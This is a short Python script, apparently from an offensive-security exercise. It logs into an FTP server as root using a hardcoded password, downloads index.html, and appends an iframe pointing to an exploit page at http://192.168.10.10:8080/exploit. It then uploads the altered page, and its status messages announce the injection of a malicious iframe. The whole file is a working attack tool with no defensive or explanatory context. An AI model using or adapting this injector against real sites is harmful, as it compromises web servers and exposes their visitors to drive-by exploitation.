import ftplib

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp',  'w') #open temp file for page
    ftp.retrlines('RETR '+ page, f.write ) #get server page  data and write to temp file of that page
    print("[+] Downloaded Page: " + page)
    f.write(redirect) # write redirect code to page
    f.close()
    print("[+] Inject Malicious Iframe on: " + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print("[+] Uploaded Injected Page: " + page)

host = '192.168.10.10'
userName = 'root'
passWord = 'torsorajag'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src="http://192.168.10.10:8080/exploit"> </iframe>'
injectPage(ftp, 'index.html', redirect)

